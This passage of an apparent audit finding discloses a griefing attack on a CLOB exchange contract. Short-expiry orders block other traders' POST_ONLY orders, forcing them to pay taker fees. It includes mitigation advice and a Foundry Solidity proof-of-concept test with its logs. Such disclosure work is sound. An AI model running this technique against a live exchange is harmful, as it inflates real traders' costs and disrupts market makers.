      "body": "## Finding description and impact\n\nAn attacker can systematically block `POST_ONLY` orders from other traders by placing orders with very short expiration times, forcing victims to use GTC orders that become takers and pay higher fees. This attack is economically viable because order placement is free and fees only apply on matching.\n\nThe CLOB protocol allows orders to be placed with expiration timestamps. When an order expires, it is removed from the book and the maker receives a full refund of their tokens without any fees. This creates a vulnerability where an attacker can place orders with very short expiration times (e.g., 1 second) to temporarily block `POST_ONLY` orders from other traders.\n\n### Key Vulnerability Factors\n\n1. **Free Order Placement**: Submitting an order to the book is completely free - no fees are charged for order placement\n2. **Fees Only on Matching**: Trading fees (maker/taker fees) are only applied when orders are actually matched and executed\n3. **POST_ONLY Guarantee**: The `POST_ONLY` order type is specifically designed to guarantee that the user will be a **maker** (not a taker), ensuring they pay the lower maker fees\n4. **Fee Differential**: Taker fees (0.05% in tests) are significantly higher than maker fees (0.03%).\n\n### Attack Mechanism\n\nThe attack works as follows:\n\n1. **Attacker places expiring orders**: The attacker places orders at competitive prices with `cancelTimestamp = block.timestamp + 1`, flooding the order book with orders strategically placed around the spot price (here 80-90% of trading volume occurs)\n2. **POST_ONLY orders are blocked**: When victims try to place `POST_ONLY` orders at the same price, they are rejected because `getBestAskPrice() <= newOrder.price` or `getBestBidPrice() >= newOrder.price`\n3. **Victims forced to be takers**: Victims must use GTC orders instead, which immediately match and become takers, violating the POST_ONLY guarantee\n4. **Fee differential exploited**: Takers pay more fees \n\nThe key vulnerability is in the `POST_ONLY` validation logic:\n\n```solidity\n// In _executeBidLimitOrder()\nif (limitOrderType == LimitOrderType.POST_ONLY && ds.getBestAskPrice() <= newOrder.price) {\n    revert PostOnlyOrderWouldFill();\n}\n\n// In _executeAskLimitOrder()  \nif (limitOrderType == LimitOrderType.POST_ONLY && ds.getBestBidPrice() >= newOrder.price) {\n    revert PostOnlyOrderWouldFill();\n}\n```\n\nWhen expiring orders are present in the book, they temporarily set the best bid/ask prices, blocking legitimate `POST_ONLY` orders even though the expiring orders will be removed shortly.\n\n###  Impact Explanation\n\n**Medium Impact**: This attack can force traders to pay higher fees (0.05% vs 0.03%) and disrupt normal market making activities. The attack violates the fundamental guarantee of `POST_ONLY` orders - that users will be makers and pay lower fees. While the direct loss is limited to fee differentials, it creates an unfair advantage for attackers and can significantly impact trading costs for legitimate market makers who rely on `POST_ONLY` orders to ensure maker status.\n\n###  Likelihood Explanation\n\n**High Likelihood**: This attack requires minimal capital (only the tokens needed for the expiring orders, which are fully refunded) and can be executed by any user. The fact that order placement is free and fees only apply on matching makes this attack particularly easy to execute repeatedly.\n\n\n## Recommended mitigation steps\n\nTo mitigate this vulnerability, consider implementing one of the following solutions:\n\n1. **Minimum order duration**: Require orders to have a minimum time-to-live (e.g., 5 minutes) to prevent very short-lived orders from blocking POST_ONLY orders.\n\n2. **Add order placement fees**: Implement fees for placing orders to discourage spam and make the attack more costly.\n\n3. **Fee structure adjustment**: Consider making the fee differential smaller to reduce the economic incentive for this attack.\n\nThe most effective solution would be to implement a minimum order duration requirement, as it directly addresses the root cause while maintaining the intended behavior of `POST_ONLY` orders and preserving the fundamental guarantee that `POST_ONLY` users will be makers.",
      "proofOfConcept": "```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport {PoCTestBase} from \"./PoCTestBase.t.sol\";\nimport {Side, Order} from \"contracts/clob/types/Order.sol\";\nimport {ICLOB} from \"contracts/clob/ICLOB.sol\";\nimport {CLOB} from \"contracts/clob/CLOB.sol\";\nimport \"forge-std/console.sol\";\n//NOTE  this is the poc for POST_ONLY blocking attack via expiring orders\n\ncontract PoC is PoCTestBase {\n    function test_submissionValidity99() external {\n        address attacker = users[0];\n        address victim = users[1];\n        uint256 amountInBase = 1000 ether;\n        uint256 price = 100 ether;\n\n        // Setup tokens for both attacker and victim\n        setupTokens(Side.SELL, attacker, amountInBase * 3, price, true); // More tokens for flooding\n        setupTokens(Side.BUY, victim, amountInBase, price, true);\n\n        // Step 1: Attacker floods the order book with expiring orders around the spot price\n        // This blocks all POST_ONLY orders at competitive prices\n        ICLOB.PostLimitOrderArgs memory attackOrder1 = ICLOB.PostLimitOrderArgs({\n            amountInBase: amountInBase,\n            clientOrderId: 0,\n            price: price, // At spot price\n            cancelTimestamp: uint32(block.timestamp + 1), // Expires in 1 second\n            side: Side.SELL,\n            limitOrderType: ICLOB.LimitOrderType.GOOD_TILL_CANCELLED\n        });\n        \n        ICLOB.PostLimitOrderArgs memory attackOrder2 = ICLOB.PostLimitOrderArgs({\n            amountInBase: amountInBase,\n            clientOrderId: 0,\n            price: price - 1 ether, // Slightly below spot price\n            cancelTimestamp: uint32(block.timestamp + 1), // Expires in 1 second\n            side: Side.SELL,\n            limitOrderType: ICLOB.LimitOrderType.GOOD_TILL_CANCELLED\n        });\n        \n        ICLOB.PostLimitOrderArgs memory attackOrder3 = ICLOB.PostLimitOrderArgs({\n            amountInBase: amountInBase,\n            clientOrderId: 0,\n            price: price + 1 ether, // Slightly above spot price\n            cancelTimestamp: uint32(block.timestamp + 1), // Expires in 1 second\n            side: Side.SELL,\n            limitOrderType: ICLOB.LimitOrderType.GOOD_TILL_CANCELLED\n        });\n        \n        // Attacker places all orders (free placement)\n        vm.startPrank(attacker);\n        clob.postLimitOrder(attacker, attackOrder1);\n        clob.postLimitOrder(attacker, attackOrder2);\n        clob.postLimitOrder(attacker, attackOrder3);\n        vm.stopPrank();\n\n        console.log(\"Attacker flooded order book with 3 expiring orders around spot price\");\n        console.log(\"All POST_ONLY orders at competitive prices are now blocked\");\n\n        // Step 2: Victim tries to place POST_ONLY orders at various prices - all blocked\n        ICLOB.PostLimitOrderArgs memory victimOrder1 = ICLOB.PostLimitOrderArgs({\n            amountInBase: amountInBase,\n            clientOrderId: 0,\n            price: price, // At spot price\n            cancelTimestamp: uint32(0), // Never expires\n            side: Side.BUY,\n            limitOrderType: ICLOB.LimitOrderType.POST_ONLY\n        });\n\n        ICLOB.PostLimitOrderArgs memory victimOrder2 = ICLOB.PostLimitOrderArgs({\n            amountInBase: amountInBase,\n            clientOrderId: 0,\n            price: price - 1 ether, // Below spot price\n            cancelTimestamp: uint32(0), // Never expires\n            side: Side.BUY,\n            limitOrderType: ICLOB.LimitOrderType.POST_ONLY\n        });\n\n        ICLOB.PostLimitOrderArgs memory victimOrder3 = ICLOB.PostLimitOrderArgs({\n            amountInBase: amountInBase,\n            clientOrderId: 0,\n            price: price + 1 ether, // Above spot price\n            cancelTimestamp: uint32(0), // Never expires\n            side: Side.BUY,\n            limitOrderType: ICLOB.LimitOrderType.POST_ONLY\n        });\n\n        // All POST_ONLY orders should be blocked\n        vm.expectRevert(CLOB.PostOnlyOrderWouldFill.selector);\n        vm.prank(victim);\n        clob.postLimitOrder(victim, victimOrder1);\n\n        vm.expectRevert(CLOB.PostOnlyOrderWouldFill.selector);\n        vm.prank(victim);\n        clob.postLimitOrder(victim, victimOrder2);\n\n        vm.expectRevert(CLOB.PostOnlyOrderWouldFill.selector);\n        vm.prank(victim);\n        clob.postLimitOrder(victim, victimOrder3);\n\n        console.log(\"All POST_ONLY orders blocked - victim forced to use GTC orders\");\n\n        // Step 3: Victim is forced to use GTC orders which become takers\n        ICLOB.PostLimitOrderArgs memory victimGTC = ICLOB.PostLimitOrderArgs({\n            amountInBase: amountInBase,\n            clientOrderId: 0,\n            price: price,\n            cancelTimestamp: uint32(0),\n            side: Side.BUY,\n            limitOrderType: ICLOB.LimitOrderType.GOOD_TILL_CANCELLED\n        });\n        \n        vm.prank(victim);\n        ICLOB.PostLimitOrderResult memory result = clob.postLimitOrder(victim, victimGTC);\n        \n        // Verify victim became taker and paid higher fees\n        console.log(\"Victim taker fee:\", result.takerFee);\n        assertGt(result.takerFee, 0, \"Victim should have paid taker fees\");\n\n        // Step 4: Check attacker's balance after the attack\n        uint256 attackerQuoteBalance = clobManager.accountManager().getAccountBalance(attacker, address(quoteToken));\n        console.log(\"Attacker quote balance after attack:\", attackerQuoteBalance);\n        \n        // The attacker should have received quote tokens from the trade (as maker)\n        // This shows that the attack was successful: victim paid taker fees while attacker got maker benefits\n        assertGt(attackerQuoteBalance, 0, \"Attacker should have received quote tokens from the trade\");\n    }\n}\n\n```\nLogs:\n```\n  Attacker flooded order book with 3 expiring orders around spot price\n  All POST_ONLY orders at competitive prices are now blocked\n  All POST_ONLY orders blocked - victim forced to use GTC orders\n  Victim taker fee: 500000000000000000\n  Attacker quote balance after attack: 98970300000000000000000\n```",
